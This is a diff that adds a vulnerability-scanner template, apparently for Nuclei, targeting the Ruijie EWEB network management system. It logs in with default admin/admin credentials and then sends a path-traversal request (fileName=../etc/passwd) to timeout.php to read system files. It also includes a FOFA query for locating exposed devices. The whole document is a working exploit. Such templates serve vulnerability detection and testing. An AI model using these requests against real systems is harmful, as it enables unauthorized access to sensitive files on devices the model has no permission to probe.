@@ -1,0 +1,38 @@
+id: ruijie-route-timeout-fileread
+
+info:
+  name: 锐捷 EWEB 网管系统 timeout.php 任意文件读取
+  author: avic123
+  severity: high
+  description: |
+    锐捷 EWEB 网管系统 /system_pi/timeout.php 的 fileName 参数存在任意文件读取，未授权可获取系统敏感文件。
+  reference:
+    - https://github.com/zan8in/afrog-pocs/blob/main/vulnerability/ruijie-route-timeout-fileread.yaml
+  metadata:
+    max-request: 2
+    fofa-query: title="锐捷网络-EWEB网管系统"
+    verified: true
+  tags: ruijie,eweb,lfi,fileread
+
+http:
+  - raw:
+      - |
+        POST /ddi/server/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=admin&password=admin?
+
+      - |
+        POST /system_pi/timeout.php?a=getFile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        fileName=../etc/passwd
+
+    cookie-reuse: true
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200 && regex("root:.*:0:0:", body_2)'
